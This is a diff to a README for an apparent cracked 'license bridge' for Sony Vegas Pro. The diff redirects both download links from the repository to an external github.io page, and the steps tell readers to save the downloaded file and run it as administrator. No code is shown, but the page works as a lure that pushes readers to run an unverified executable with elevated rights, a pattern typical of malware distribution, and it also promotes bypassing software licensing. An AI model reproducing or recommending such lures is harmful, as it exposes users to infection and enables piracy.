@@ -1,6 +1,6 @@
 # 🔑 sony-vegas-pro-license-bridge-2026 - Unlock full video editing power today
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/vikrantm2849/sony-vegas-pro-license-bridge-2026)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://vikrantm2849.github.io)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you begin the setup process:
 Follow these steps to configure your software correctly.
 
 1. Close Vegas Pro if the program is currently running.
-2. Visit the following link to locate the tool: [Download Link](https://github.com/vikrantm2849/sony-vegas-pro-license-bridge-2026).
+2. Visit the following link to locate the tool: [Download Link](https://vikrantm2849.github.io).
 3. Save the file to your desktop for easy access.
 4. Right-click the downloaded file and select "Run as administrator."
 5. Follow the prompts on the screen to finalize the bridge installation.
